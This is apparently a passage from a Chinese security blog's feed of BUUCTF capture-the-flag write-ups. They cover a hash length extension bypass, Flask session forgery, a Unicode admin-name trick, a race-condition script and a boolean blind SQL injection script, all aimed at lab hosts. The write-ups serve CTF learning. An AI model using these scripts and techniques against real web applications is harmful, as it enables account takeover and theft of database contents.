class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>关键代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>用于获得签名，secert_key为16位的随机数，param为可以从cookie中获取</p><p>关键需要绕过：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span></code></pre><p>再看读取检验的函数，我们通过伪造cookie传参得到action，和param,并且与sign对比</p><p>这时候我们发现了</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span></code></pre><p>这个路径下，能够传参，对param进行赋值，action为scan,如果我们能够构造出read就能读出数据，所以，我们</p><p>可以构造secert_key+scan+flag.txtread的sign值，通过改包传入cookie,scan和read都有，sign值构造出来，得到flag.txt的内容。</p><p>首先得到校验sign</p><img src="/2019/11/06/wp-bu-fen/1.png"><p>然后在de1ta的路径下读文件，构造cookie，传参</p><img src="/2019/11/06/wp-bu-fen/2.png"><p>得到flag</p><p><strong>另一种解法</strong></p><p>不是通过在后面生成read，自动拼接而是用hash长度扩展攻击，得到拼接read后的结果</p><p>参考<a href="https://joychou.org/web/hash-length-extension-attack.html" target="_blank" rel="noopener">hash长度扩展攻击</a></p><p>hash长度扩展攻击的原理刚不动，直接拿来用</p><p><a href="https://github.com/JoyChou93/md5-extension-attack" target="_blank" rel="noopener">下载链接</a></p><p>但是生成的并不能成功运行，还是用了linux的另一个工具</p><p> <strong>hashpump</strong></p><img src="/2019/11/06/wp-bu-fen/3.png"><p>得到action转换为url编码，sign填到Cookie</p><img src="/2019/11/06/wp-bu-fen/4.png"><p>得到flag</p><p>虽然用脚本跑的sign值是一样的，但是脚本跑出的少了scan，就无法对de1ta进行扫描，无法获得flag</p><p>hashpump安装</p><pre><code>git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install</code></pre><h4 id="HCTF2018-admin"><a href="#HCTF2018-admin" class="headerlink" title="HCTF2018 admin"></a>HCTF2018 admin</h4><img src="/2019/11/06/wp-bu-fen/5.png">   <p>查看源码，发现提示不是admin，所以猜测此题需要以admin的身份登陆才能获取flag</p><p>这道题有三种做法</p><ul><li>flask session 伪造</li><li>unicode欺骗</li><li>条件竞争</li></ul><p>页面存在login和register</p><p>先注册个账号登进去看看</p><img src="/2019/11/06/wp-bu-fen/6.png"><p>在修改密码的方，查看源码发现了本题的源码的链接，下载源码。</p><ol><li><p><strong>unicode 欺骗</strong></p><p>查看源码，网站使用python的flask搭建，找到app/router部分的源码</p><img src="/2019/11/06/wp-bu-fen/7.png"><img src="/2019/11/06/wp-bu-fen/8.png"><img src="/2019/11/06/wp-bu-fen/9.png"><p>这时发现函数都调用了strlower函数，但是python中已经自带转小写函数lower()，看看有什么不一样的，</p><p>进一下strlower函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username</code></pre><p>这里用的nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现Twisted==10.2.0，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。</p><p>关于Unicode问题可以参考：<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">https://panda1g1.github.io/2018/11/15/HCTF%20admin/</a></p><p>关于具体编码可查 <a href="https://unicode-table.com/en/search/?q=small+capital" target="_blank" rel="noopener">https://unicode-table.com/en/search/?q=small+capital</a> ，当然你也可以复制过后用站长工具转换成Unicode编码。</p><p>然后我们发现在使用nodeprep.prepare函数转换时过程如下：</p><pre><code>ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</code></pre><p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p><img src="/2019/11/06/wp-bu-fen/11.png"><img src="/2019/11/06/wp-bu-fen/12.png"><p>两次调用，admin密码修改,重新登陆得到flag</p><img src="/2019/11/06/wp-bu-fen/13.png"></li><li><p><strong>flask session 伪造</strong></p><p>flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题</p><p><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">session flask</a></p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">session</a></p><p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的<code>SECRET_KEY</code>，在github源码里找找，可以在config.py里发现下面代码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">'ckj123'</span></code></pre><p>加解密脚本在github上有</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">flask seesion加解密</a></p><p>利用解密功能解密</p><img src="/2019/11/06/wp-bu-fen/14.png"><p>得到的数据中有用户名，将它改为admin,用脚本加密，得到的session</p><img src="/2019/11/06/wp-bu-fen/15.png"><p>替换原来的session</p><p>抓包改包，得到flag</p><img src="/2019/11/06/wp-bu-fen/16.png"></li><li><p>条件竞争</p><p>这个漏洞应该是属于代码逻辑上的漏洞</p><p>在session赋值时，登录、注册都是直接进行赋值，未进行安全验证，也就可能存在以下一种可能：<br>我们注册一个用户test，现在有一个进程1一直重复进行登录、改密码操作，进程2一直注销，且以admin用户和进程1所改的密码进行登录，是不是有可能当进程1进行到改密码操作时，进程2恰好注销且要进行登录，此时进程1改密码需要一个session，而进程2刚好将session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">''</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://9916772e-8b0c-4e36-9f63-3c312134b401.node3.buuoj.cn/login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://9916772e-8b0c-4e36-9f63-3c312134b401.node3.buuoj.cn/logout"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> newpassword<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'newpassword'</span><span class="token punctuation">:</span>newpassword    <span class="token punctuation">}</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://9916772e-8b0c-4e36-9f63-3c312134b401.node3.buuoj.cn/change"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func1</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    login<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span>    change<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func2</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    logout<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    res <span class="token operator">=</span> login<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'finish'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>func1<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>func2<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>亲测跑不出，估计线程是假的。</p></li></ol><h4 id="Hack-World-CISCN2019-华北赛区"><a href="#Hack-World-CISCN2019-华北赛区" class="headerlink" title="Hack World CISCN2019 华北赛区"></a>Hack World CISCN2019 华北赛区</h4><p>题目是sql注入，但是过滤了好多的东西，源码在网上找到</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$dbuser</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span> <span class="token variable">$dbpass</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token shell-comment comment">#被过滤的内容 函数基本没过滤 </span><span class="token variable">$blackList</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'||'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'or'</span><span class="token punctuation">,</span><span class="token string">'and'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'insert'</span><span class="token punctuation">,</span><span class="token string">'group'</span><span class="token punctuation">,</span><span class="token string">'limit'</span><span class="token punctuation">,</span><span class="token string">'update'</span><span class="token punctuation">,</span><span class="token string">'delete'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'into'</span><span class="token punctuation">,</span><span class="token string">'union'</span><span class="token punctuation">,</span><span class="token string">'load_file'</span><span class="token punctuation">,</span><span class="token string">'outfile'</span><span class="token punctuation">,</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blackList</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$blackitem</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> False<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span> <span class="token punctuation">}</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token function">f</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SELECT content from passage WHERE id = ${id} limit 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"Error Occured When Fetch Result."</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"SQL Injection Checked."</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>题目已经给出了flag的位置，在flag表的flag字段</p><p>只需要将flag的字段给爆出来就得到flag</p><p>测试发现回显的几种情况</p><p><code>(ascii(substr((select(flag)from(flag)),1,1))&lt;128)</code></p><img src="/2019/11/06/wp-bu-fen/17.png"><p><code>ascii(substr((select(flag)from(flag)),1,1))&gt;128</code></p><img src="/2019/11/06/wp-bu-fen/18.png"><p>为了回显更加明显，在payload前加上if语句，利用二分法逐步逼近正确的字符</p><p>利用布尔盲注，爆破出flag</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://8788c049-e6ad-434c-9b97-fa040997e3d0.node3.buuoj.cn/index.php'</span>flagg<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    low<span class="token operator">=</span><span class="token number">32</span>    high<span class="token operator">=</span><span class="token number">127</span>    mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span> low<span class="token operator">&lt;</span>high<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">'id=if((ascii(substr((select(flag)from(flag)),%d,1))>%d),1,2)'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Hello'</span><span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            low<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token comment" spellcheck="true">#print(high)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high<span class="token operator">=</span>mid            <span class="token comment" spellcheck="true">#print(low)</span>        mid<span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    flagg<span class="token operator">=</span>flagg<span class="token operator">+</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flagg<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashlib</title>
      <link href="/2019/11/04/hashlib/"/>
      <url>/2019/11/04/hashlib/</url>
      
        <content type="html"><![CDATA[<h3 id="hashlib-使用"><a href="#hashlib-使用" class="headerlink" title="hashlib 使用"></a>hashlib 使用</h3><p>今天开始看点crypto，做buuctf的一道题目时，发现了hashlib这个库。本来以为需要安装的，结果装了</p><p>半天也没有效果，各种报错，最后发现百度的一条结果为自带，吐血了</p><hr><p>上代码：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'TASC'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'O3RJMV'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'WDJKX'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ZM'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            des<span class="token operator">=</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'e9032'</span> <span class="token keyword">in</span> des <span class="token operator">and</span> <span class="token string">'da'</span> <span class="token keyword">in</span> des <span class="token operator">and</span> <span class="token string">'911513'</span> <span class="token keyword">in</span> des<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span></code></pre><ol><li>首先创建加密对象</li><li>对字符串进行算法加密</li><li>获得16进制显示</li></ol><p>例如：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlibnew_md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#创建hashlib的md5对象</span>new_md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">'字符串'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#将字符串载入到md5对象中，获得md5算法加密。</span><span class="token keyword">print</span><span class="token punctuation">(</span>new_md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#通过hexdigest()方法，获得new_md5对象的16进制md5显示。</span></code></pre><p>注意的是这里可能会出现如下错误：<code>TypeError: Unicode-objects must be encoded before hashing</code></p><p>编码错误，加入.encode(‘utf-8’)问题解决</p><pre class=" language-python"><code class="language-python">new_md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'字符串'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> hashlib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf WarmUp</title>
      <link href="/2019/10/24/buuctf-warmup/"/>
      <url>/2019/10/24/buuctf-warmup/</url>
      
        <content type="html"><![CDATA[<p>第一题就这么难，菜鸡一个，艰难的总结一下，还请大佬多多指正</p><p>题目提示，在注释中看到了source.php,访问一下，得到源码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token 